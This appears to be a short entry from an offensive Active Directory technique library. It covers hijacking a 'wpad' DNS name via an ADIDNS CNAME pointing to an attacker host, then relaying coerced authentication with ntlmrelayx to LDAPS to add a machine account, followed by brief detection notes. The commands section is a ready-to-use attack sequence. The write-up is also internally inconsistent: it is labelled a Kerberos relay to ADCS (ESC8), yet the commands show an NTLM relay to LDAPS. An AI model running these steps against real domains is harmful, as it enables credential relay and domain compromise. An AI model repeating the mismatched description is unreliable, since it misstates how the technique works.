---
id: cname_relay
type: technique
label: "Kerberos CNAME-abuse relay to ADCS (ESC8)"
phase: "initial"
tools: ["impacket"]
cve: null
detect: "Unexpected DNS CNAME changes; certificate issuance outside normal workflow."
mitre: "T1649"
tag: "new"
---


# Kerberos CNAME-abuse relay to ADCS (ESC8)

### Affected object / attribute
**ADIDNS zone / record** (`MicrosoftDNS`), default `Authenticated Users` create rights in some configurations.

### Concept (deep)
Create a **CNAME** pointing at the attacker, then coercion sends a privileged host’s auth to the attacker → relay. Pairs with **mitm6** / **ntlmrelayx**.

### Commands
```bash
# ── Create a CNAME via PowerMad ──────────────────────────────────────
Invoke-DNSUpdate -DNSType CNAME -Name 'wpad' -Data 'attacker.corp.local'

# ── Relay to LDAPS ───────────────────────────────────────────────────
ntlmrelayx.py -t ldaps://10.10.10.5 --add-computer
```

### Detection
**5136** on `MicrosoftDNS`; **4662** zone writes; disable insecure dynamic updates.

---
